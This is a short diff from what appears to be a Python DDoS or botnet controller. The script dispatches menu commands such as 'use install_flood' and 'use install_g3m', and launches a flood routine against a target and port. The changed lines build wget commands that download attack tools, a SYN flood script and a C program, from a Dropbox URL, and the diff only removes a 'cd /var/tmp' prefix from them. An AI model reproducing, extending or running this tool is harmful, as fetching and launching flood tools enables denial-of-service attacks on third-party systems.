@@ -295,10 +295,10 @@ def main():
             attackg3m(target,porta)    
 
         elif search("use install_flood",selecao):
-            comando = "cd /var/tmp && wget https://dl.dropboxusercontent.com/u/97321327/flood.py"
+            comando = "wget https://dl.dropboxusercontent.com/u/97321327/flood.py"
             installSYN(comando)
         elif search("use install_g3m",selecao):
-            comando = "cd /var/tmp && wget https://dl.dropboxusercontent.com/u/97321327/g3m.c"
+            comando = "wget https://dl.dropboxusercontent.com/u/97321327/g3m.c"
             g3m(comando)
 
         elif search("use attack_stop", selecao):
